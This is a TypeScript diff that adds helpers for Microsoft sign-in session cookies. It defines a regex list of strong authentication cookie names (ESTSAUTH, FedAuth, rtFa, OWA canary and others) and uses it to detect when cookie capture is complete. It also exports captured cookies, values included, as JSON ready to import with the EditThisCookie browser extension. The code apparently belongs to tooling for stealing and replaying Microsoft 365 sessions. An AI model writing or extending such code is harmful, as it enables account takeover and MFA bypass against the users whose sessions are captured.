@@ -172,3 +172,64 @@ export function cookieToSetUrl(c: ParsedCookie): string {
   const proto = c.secure === false ? 'http' : 'https';
   return `${proto}://${host}/`;
 }
+
+/**
+ * Session cookie names that indicate a real Microsoft sign-in (not only helper
+ * cookies). Used for OWA export quality and cookie-capture completion detection.
+ */
+export const STRONG_MICROSOFT_AUTH_COOKIE_PATTERNS: RegExp[] = [
+  /^ESTSAUTH/i,
+  /^ESTSSC$/i,
+  /^OpenIdConnect\.(token|id_token|nonce)/i,
+  /^X-OWA-CANARY$/i,
+  /^Canary$/i,
+  /^rtFa$/i,
+  /^FedAuth$/i,
+  /^RPSAuth$/i,
+  /^MSP(Auth|Requ|OK|Prof|CID|TC)$/i,
+  /^esctx$/i,
+];
+
+export function hasStrongMicrosoftSessionCookies(cookies: ParsedCookie[]): boolean {
+  return cookies.some((c) => {
+    const name = String(c.name || '').trim();
+    if (!name) return false;
+    return STRONG_MICROSOFT_AUTH_COOKIE_PATTERNS.some((re) => re.test(name));
+  });
+}
+
+export function countStrongMicrosoftSessionCookies(cookies: ParsedCookie[]): number {
+  let n = 0;
+  for (const c of cookies) {
+    const name = String(c.name || '').trim();
+    if (!name) continue;
+    if (STRONG_MICROSOFT_AUTH_COOKIE_PATTERNS.some((re) => re.test(name))) n++;
+  }
+  return n;
+}
+
+/**
+ * JSON array compatible with browser extensions such as "EditThisCookie"
+ * (domain, name, value, path, secure, expirationDate, httpOnly, sameSite, …).
+ */
+export function cookiesToEditThisCookieJson(cookies: ParsedCookie[]): string {
+  const rows = cookies.map((c) => {
+    const domain = (c.domain || '').trim() || '.login.microsoftonline.com';
+    const hostOnly = !domain.startsWith('.');
+    const exp = c.expirationDate && c.expirationDate > 0 ? c.expirationDate : undefined;
+    const path = c.path && c.path.startsWith('/') ? c.path : '/';
+    return {
+      domain,
+      expirationDate: exp,
+      hostOnly,
+      httpOnly: /ESTS|SID|session|Auth|token|nonce|esctx/i.test(c.name),
+      name: c.name,
+      path,
+      sameSite: 'unspecified',
+      secure: c.secure !== false,
+      session: !exp,
+      value: c.value,
+    };
+  });
+  return JSON.stringify(rows, null, 2) + '\n';
+}
